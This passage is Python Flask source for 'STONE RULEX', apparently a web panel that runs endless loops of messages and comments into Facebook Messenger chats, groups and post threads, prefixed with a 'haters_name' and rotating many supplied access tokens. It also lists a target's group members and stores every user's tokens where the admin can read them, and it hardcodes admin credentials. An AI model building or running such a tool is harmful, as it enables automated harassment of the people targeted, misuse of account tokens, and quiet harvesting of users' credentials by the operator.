from flask import Flask, render_template_string, request, redirect, url_for, jsonify, session, flash
import requests
import json
import time
import os
import threading
from datetime import datetime, timedelta
import uuid
import sqlite3
import hashlib
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a random secret key

# Configuration for admin credentials - can be changed here
ADMIN_CONFIG = {
    'username': 'The_stone_king_here',
    'password': 'stoneOO7'  # Change this password as needed
}

# Database initialization with enhanced schema
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Create users table with approval status
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE,
                 password TEXT,
                 admin INTEGER DEFAULT 0,
                 approved INTEGER DEFAULT 0,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    # Create user_tokens table for admin token management
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 user_id INTEGER,
                 token_value TEXT,
                 token_name TEXT,
                 is_valid BOOLEAN DEFAULT 1,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 last_checked TIMESTAMP,
                 FOREIGN KEY (user_id) REFERENCES users (id))''')
    
    # Create tasks table for persistent task management
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id TEXT PRIMARY KEY,
                 user_id INTEGER,
                 convo_uid TEXT,
                 haters_name TEXT,
                 token_name TEXT,
                 status TEXT DEFAULT 'running',
                 started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 stopped_at TIMESTAMP,
                 post_id TEXT,
                 comment_content TEXT,
                 task_type TEXT DEFAULT 'convo',
                 FOREIGN KEY (user_id) REFERENCES users (id))''')
    
    # Create task_logs table for persistent log storage
    c.execute('''CREATE TABLE IF NOT EXISTS task_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 task_id TEXT,
                 log_message TEXT,
                 timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 FOREIGN KEY (task_id) REFERENCES tasks (id))''')
    
    # Create admin user if not exists or update password if changed
    c.execute("SELECT * FROM users WHERE username = ?", (ADMIN_CONFIG['username'],))
    admin_user = c.fetchone()
    
    hashed_password = hashlib.sha256(ADMIN_CONFIG['password'].encode()).hexdigest()
    
    if admin_user:
        # Update admin password if it has changed
        c.execute("UPDATE users SET password = ? WHERE username = ?", 
                 (hashed_password, ADMIN_CONFIG['username']))
    else:
        # Create new admin user
        c.execute("INSERT INTO users (username, password, admin, approved) VALUES (?, ?, 1, 1)", 
                 (ADMIN_CONFIG['username'], hashed_password))
    
    conn.commit()
    conn.close()

init_db()

# Global variables
message_threads = {}  # Dictionary to store multiple threads with their IDs
stop_flags = {}  # Dictionary to store stop flags for each task

# Background task to clean up old logs (older than 50 minutes)
def cleanup_old_logs():
    """Background task to automatically delete logs older than 50 minutes"""
    while True:
        try:
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            
            # Calculate cutoff time (50 minutes ago)
            cutoff_time = datetime.now() - timedelta(minutes=50)
            
            # Delete old logs
            c.execute("DELETE FROM task_logs WHERE timestamp < ?", (cutoff_time,))
            deleted_count = c.rowcount
            
            conn.commit()
            conn.close()
            
            if deleted_count > 0:
                print(f"Cleaned up {deleted_count} old log entries")
            
        except Exception as e:
            print(f"Error during log cleanup: {e}")
        
        # Run cleanup every 5 minutes
        time.sleep(300)

# Start the cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_logs, daemon=True)
cleanup_thread.start()

# Authentication decorators
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def approved_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1:
            return render_template_string(pending_approval_html)
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT admin, approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1 or user[1] != 1:
            return "Admin access required", 403
        return f(*args, **kwargs)
    return decorated_function

# Enhanced logging functions with database persistence
def add_log(task_id, message):
    """Add a log entry for a specific task to database"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    c.execute("INSERT INTO task_logs (task_id, log_message) VALUES (?, ?)", (task_id, log_entry))
    conn.commit()
    conn.close()

def get_task_logs(task_id, limit=100):
    """Get logs for a specific task from database"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT log_message FROM task_logs WHERE task_id = ? ORDER BY timestamp DESC LIMIT ?", (task_id, limit))
    logs = [row[0] for row in c.fetchall()]
    conn.close()
    
    return list(reversed(logs))  # Return in chronological order

def get_user_tasks(user_id):
    """Get all tasks for a specific user"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("""SELECT id, convo_uid, haters_name, token_name, status, started_at, stopped_at, task_type 
                 FROM tasks WHERE user_id = ? ORDER BY started_at DESC""", (user_id,))
    tasks = c.fetchall()
    conn.close()
    
    task_list = []
    for task in tasks:
        task_dict = {
            'id': task[0],
            'convo_uid': task[1],
            'haters_name': task[2],
            'token_name': task[3],
            'status': task[4],
            'started_at': task[5],
            'stopped_at': task[6],
            'task_type': task[7] if task[7] else 'convo'
        }
        task_list.append(task_dict)
    
    return task_list

def create_task_record(task_id, user_id, convo_uid, haters_name, token_name, task_type='convo', post_id=None):
    """Create a task record in database"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("""INSERT INTO tasks (id, user_id, convo_uid, haters_name, token_name, status, task_type, post_id) 
                 VALUES (?, ?, ?, ?, ?, 'running', ?, ?)""", 
              (task_id, user_id, convo_uid, haters_name, token_name, task_type, post_id))
    conn.commit()
    conn.close()

def update_task_status(task_id, status):
    """Update task status in database"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    if status == 'stopped':
        c.execute("UPDATE tasks SET status = ?, stopped_at = CURRENT_TIMESTAMP WHERE id = ?", (status, task_id))
    else:
        c.execute("UPDATE tasks SET status = ? WHERE id = ?", (status, task_id))
    
    conn.commit()
    conn.close()

# Token management functions
def save_user_token(user_id, token_value, token_name, is_valid=True):
    """Save a token for a user"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if token already exists for this user
    c.execute("SELECT id FROM user_tokens WHERE user_id = ? AND token_value = ?", (user_id, token_value))
    existing = c.fetchone()
    
    if not existing:
        c.execute("""INSERT INTO user_tokens (user_id, token_value, token_name, is_valid, last_checked) 
                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""", 
                  (user_id, token_value, token_name, is_valid))
        conn.commit()
    
    conn.close()

def get_all_user_tokens():
    """Get all tokens grouped by user (admin only)"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("""SELECT u.username, ut.token_value, ut.token_name, ut.is_valid, ut.created_at, ut.last_checked
                 FROM user_tokens ut
                 JOIN users u ON ut.user_id = u.id
                 ORDER BY u.username, ut.created_at DESC""")
    
    tokens = c.fetchall()
    conn.close()
    
    # Group tokens by username
    user_tokens = {}
    for token in tokens:
        username = token[0]
        if username not in user_tokens:
            user_tokens[username] = []
        
        user_tokens[username].append({
            'token_value': token[1],
            'token_name': token[2],
            'is_valid': token[3],
            'created_at': token[4],
            'last_checked': token[5]
        })
    
    return user_tokens

def check_token_validity(token):
    """Check if a Facebook token is valid and get user info"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name,id,picture"
        response = requests.get(url)
        
        if response.status_code == 200:
            user_data = response.json()
            return {
                'valid': True,
                'message': 'Token is valid',
                'name': user_data.get('name', 'Unknown'),
                'id': user_data.get('id', 'Unknown'),
                'picture': user_data.get('picture', {}).get('data', {}).get('url', None)
            }
        else:
            error_data = response.json()
            return {
                'valid': False,
                'message': f'Invalid token: {error_data.get("error", {}).get("message", "Unknown error")}',
                'name': None,
                'id': None,
                'picture': None
            }
    except Exception as e:
        return {
            'valid': False,
            'message': f'Error checking token: {str(e)}',
            'name': None,
            'id': None,
            'picture': None
        }

def fetch_messenger_groups(token):
    """Fetch messenger groups using the provided token"""
    try:
        # Get user's conversations/threads
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}&fields=participants,name,id&limit=100"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            for conversation in data.get('data', []):
                # Check if it's a group (more than 2 participants)
                participants = conversation.get('participants', {}).get('data', [])
                if len(participants) > 2:
                    group_name = conversation.get('name', 'Unnamed Group')
                    group_id = conversation.get('id', '')
                    
                    groups.append({
                        'name': group_name,
                        'uid': group_id
                    })
            
            return {
                'success': True,
                'groups': groups,
                'message': f'Found {len(groups)} groups'
            }
        else:
            error_data = response.json()
            return {
                'success': False,
                'groups': [],
                'message': f'API Error: {error_data.get("error", {}).get("message", "Unknown error")}'
            }
    except Exception as e:
        return {
            'success': False,
            'groups': [],
            'message': f'Error fetching groups: {str(e)}'
        }

def fetch_group_members(token, group_uid):
    """Fetch members of a Messenger group using the provided token"""
    try:
        # Get group conversation details including participants
        url = f"https://graph.facebook.com/v17.0/{group_uid}?access_token={token}&fields=participants,name"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            participants = data.get('participants', {}).get('data', [])
            group_name = data.get('name', 'Unnamed Group')
            
            members = []
            for participant in participants:
                member_name = participant.get('name', 'Unknown')
                member_id = participant.get('id', '')
                
                members.append({
                    'name': member_name,
                    'id': member_id
                })
            
            return {
                'success': True,
                'group_name': group_name,
                'members': members,
                'message': f'Found {len(members)} members in {group_name}'
            }
        else:
            error_data = response.json()
            return {
                'success': False,
                'group_name': None,
                'members': [],
                'message': f'API Error: {error_data.get("error", {}).get("message", "Unknown error")}'
            }
    except Exception as e:
        return {
            'success': False,
            'group_name': None,
            'members': [],
            'message': f'Error fetching group members: {str(e)}'
        }

def get_token_name(token):
    """Get the name associated with a token for identification"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name"
        response = requests.get(url)
        if response.status_code == 200:
            user_data = response.json()
            return user_data.get('name', 'Unknown')
        else:
            return 'Invalid Token'
    except:
        return 'Unknown'

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting bot with {num_messages} messages and {num_tokens} tokens")
    add_log(task_id, f"Target conversation: {convo_uid}")
    add_log(task_id, f"Message prefix: {haters_name}")
    add_log(task_id, f"Speed: {speed} seconds between messages")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for message_index in range(num_messages):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                token_name = get_token_name(access_token)

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_uid}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"✅ Message {message_index + 1}/{num_messages} | Token: {token_name} | Content: {haters_name} {message} | Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    error_info = response.text[:100] if response.text else "Unknown error"
                    log_msg = f"❌ Failed Message {message_index + 1}/{num_messages} | Token: {token_name} | Error: {error_info} | At {current_time}"
                    add_log(task_id, log_msg)
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "🔄 All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"⚠️ An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5) # Wait before retrying on error
    
    # Update task status in database
    update_task_status(task_id, 'stopped')
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "🏁 Bot execution completed")

def send_comments(task_id, post_id, tokens, comment_content, speed, haters_name):
    """Send comments to a Facebook post using multiple tokens"""
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.facebook.com'
    }

    comments = comment_content.splitlines()
    tokens = tokens.splitlines()

    num_comments = len(comments)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_comments)

    add_log(task_id, f"Starting Facebook post commenting bot with {num_comments} comments and {num_tokens} tokens")
    add_log(task_id, f"Target post ID: {post_id}")
    add_log(task_id, f"Comment prefix: {haters_name}")
    add_log(task_id, f"Speed: {speed} seconds between comments")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for comment_index in range(num_comments):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = comment_index % max_tokens
                access_token = tokens[token_index].strip()
                token_name = get_token_name(access_token)

                comment = comments[comment_index].strip()

                # Facebook Graph API endpoint for posting comments
                url = f"https://graph.facebook.com/v17.0/{post_id}/comments"
                parameters = {
                    'access_token': access_token, 
                    'message': f'{haters_name} {comment}'
                }
                
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    response_data = response.json()
                    comment_id = response_data.get('id', 'Unknown')
                    log_msg = f"✅ Comment {comment_index + 1}/{num_comments} | Token: {token_name} | Content: {haters_name} {comment} | Comment ID: {comment_id} | Posted at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    error_info = response.text[:100] if response.text else "Unknown error"
                    log_msg = f"❌ Failed Comment {comment_index + 1}/{num_comments} | Token: {token_name} | Error: {error_info} | At {current_time}"
                    add_log(task_id, log_msg)
                
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "🔄 All comments posted. Restarting the process...")
        except Exception as e:
            error_msg = f"⚠️ An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5)  # Wait before retrying on error
    
    # Update task status in database
    update_task_status(task_id, 'stopped')
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "🏁 Facebook post commenting bot execution completed")

def send_group_messages(task_id, group_uid, tokens, message_content, speed, haters_name):
    """Send messages to a Messenger group using multiple tokens"""
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.messenger.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting Messenger group messaging bot with {num_messages} messages and {num_tokens} tokens")
    add_log(task_id, f"Target group UID: {group_uid}")
    add_log(task_id, f"Message prefix: {haters_name}")
    add_log(task_id, f"Speed: {speed} seconds between messages")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for message_index in range(num_messages):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                token_name = get_token_name(access_token)

                message = messages[message_index].strip()

                # Facebook Graph API endpoint for sending messages to groups
                url = f"https://graph.facebook.com/v17.0/t_{group_uid}/"
                parameters = {
                    'access_token': access_token, 
                    'message': f'{haters_name} {message}'
                }
                
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"✅ Message {message_index + 1}/{num_messages} | Token: {token_name} | Content: {haters_name} {message} | Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    error_info = response.text[:100] if response.text else "Unknown error"
                    log_msg = f"❌ Failed Message {message_index + 1}/{num_messages} | Token: {token_name} | Error: {error_info} | At {current_time}"
                    add_log(task_id, log_msg)
                
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "🔄 All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"⚠️ An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5)  # Wait before retrying on error
    
    # Update task status in database
    update_task_status(task_id, 'stopped')
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "🏁 Messenger group messaging bot execution completed")

# HTML Templates
pending_approval_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Pending Approval</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .pending-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            padding: 60px 40px;
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        
        .pending-icon {
            font-size: 5rem;
            color: #ffc107;
            margin-bottom: 30px;
        }
        
        .pending-title {
            font-size: 2.5rem;
            color: #495057;
            margin-bottom: 20px;
            font-weight: 800;
        }
        
        .pending-message {
            font-size: 1.2rem;
            color: #6c757d;
            line-height: 1.6;
            margin-bottom: 40px;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="pending-container">
        <div class="pending-icon">
            <i class="fas fa-clock"></i>
        </div>
        <h1 class="pending-title">Account Pending Approval</h1>
        <p class="pending-message">
            Your account has been created successfully but is currently pending admin approval. 
            Please wait for an administrator to approve your account before you can access the tools.
        </p>
        <a href="/logout" class="btn-logout">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </div>
</body>
</html>
'''

auth_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Authentication</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .auth-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }
        .auth-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 50px 30px;
            text-align: center;
        }
        .auth-title { font-size: 3rem; font-weight: 900; margin-bottom: 15px; }
        .auth-tabs { display: flex; background: #f8f9fa; }
        .auth-tab {
            flex: 1;
            padding: 25px 20px;
            text-align: center;
            cursor: pointer;
            background: transparent;
            border: none;
            font-weight: 700;
            color: #6c757d;
        }
        .auth-tab.active { background: white; color: #667eea; }
        .auth-form { display: none; padding: 45px 35px; }
        .auth-form.active { display: block; }
        .form-group { margin-bottom: 30px; }
        label { display: block; margin-bottom: 12px; font-weight: 700; color: #495057; }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            font-size: 16px;
        }
        .btn {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .btn-success { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; }
        .btn-warning { background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%); color: #212529; }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="auth-header">
            <h1 class="auth-title">STONE RULEX</h1>
            <p>Welcome To The Stone Rulex Convo Server</p>
        </div>
        
        <div class="auth-tabs">
            <button class="auth-tab active" onclick="switchAuthTab('login')">Login</button>
            <button class="auth-tab" onclick="switchAuthTab('register')">Register</button>
            <button class="auth-tab" onclick="switchAuthTab('admin')">Admin Login</button>
        </div>
        
        <div id="login-form" class="auth-form active">
            <form action="/login" method="post">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary">Access Platform</button>
            </form>
        </div>
        
        <div id="register-form" class="auth-form">
            <form action="/register" method="post">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <div class="form-group">
                    <label>Confirm Password</label>
                    <input type="password" name="confirm_password" required>
                </div>
                <button type="submit" class="btn btn-success">Create Account</button>
            </form>
        </div>
        
        <div id="admin-form" class="auth-form">
            <form action="/admin_login" method="post">
                <div class="form-group">
                    <label>Admin Username</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Admin Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-warning">Admin Access</button>
            </form>
        </div>
    </div>

    <script>
        function switchAuthTab(tab) {
            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
            
            if (tab === 'login') {
                document.querySelector('.auth-tab:first-child').classList.add('active');
                document.getElementById('login-form').classList.add('active');
            } else if (tab === 'register') {
                document.querySelector('.auth-tab:nth-child(2)').classList.add('active');
                document.getElementById('register-form').classList.add('active');
            } else if (tab === 'admin') {
                document.querySelector('.auth-tab:nth-child(3)').classList.add('active');
                document.getElementById('admin-form').classList.add('active');
            }
        }
    </script>
</body>
</html>
'''

# Enhanced main application HTML with separate tool sections and individual toggle functionality
html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Advanced Task Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            max-width: 1400px;
            margin: 0 auto;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .header h1 { font-size: 3.5rem; margin-bottom: 15px; font-weight: 900; }
        .header p { font-size: 1.3rem; opacity: 0.95; font-weight: 500; }
        
        .user-info {
            position: absolute;
            top: 25px;
            right: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .user-username { color: white; font-weight: 700; font-size: 1.1rem; }
        
        .btn-logout, .btn-admin {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 25px;
            cursor: pointer;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
        }
        
        .tool-sections {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            padding: 40px;
        }
        
        .tool-section {
            background: white;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }
        
        .tool-section:hover { transform: translateY(-5px); }
        
        .tool-image {
            width: 100%;
            max-width: 200px;
            height: 150px;
            object-fit: cover;
            border-radius: 15px;
            margin-bottom: 20px;
        }
        
        .tool-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            text-transform: uppercase;
        }
        
        .tool-button.token-check {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
        }
        
        .tool-button.uid-fetcher {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
        }
        
        .tool-content {
            display: none;
            margin-top: 30px;
            text-align: left;
        }
        
        .tool-content.active { display: block; }
        
        .form-group { margin-bottom: 20px; }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 700;
            color: #495057;
        }
        
        input[type="text"], input[type="number"], textarea, input[type="file"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            font-size: 14px;
        }
        
        textarea { min-height: 100px; resize: vertical; }
        
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            margin: 5px;
        }
        
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .btn-success { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; }
        .btn-danger { background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%); color: white; }
        .btn-warning { background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%); color: #212529; }
        
        .task-item {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .task-id { font-weight: 800; color: #667eea; font-size: 1.2rem; }
        
        .task-status {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
        }
        
        .status-running { background: #28a745; color: white; }
        .status-stopped { background: #dc3545; color: white; }
        
        .task-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .task-info-item {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .task-info-label {
            font-size: 12px;
            color: #6c757d;
            text-transform: uppercase;
            margin-bottom: 5px;
            font-weight: 700;
        }
        
        .task-info-value { font-weight: 700; color: #495057; }
        
        .task-buttons { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
        
        .log-container {
            background: #1a1a1a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 20px;
            border-radius: 10px;
            height: 300px;
            overflow-y: auto;
            border: 2px solid #333;
            display: block; /* Always visible */
        }
        
        .log-entry {
            margin-bottom: 5px;
            line-height: 1.4;
            padding: 2px 0;
        }
        
        .result-container { margin-top: 20px; }
        
        .result-item {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 20px;
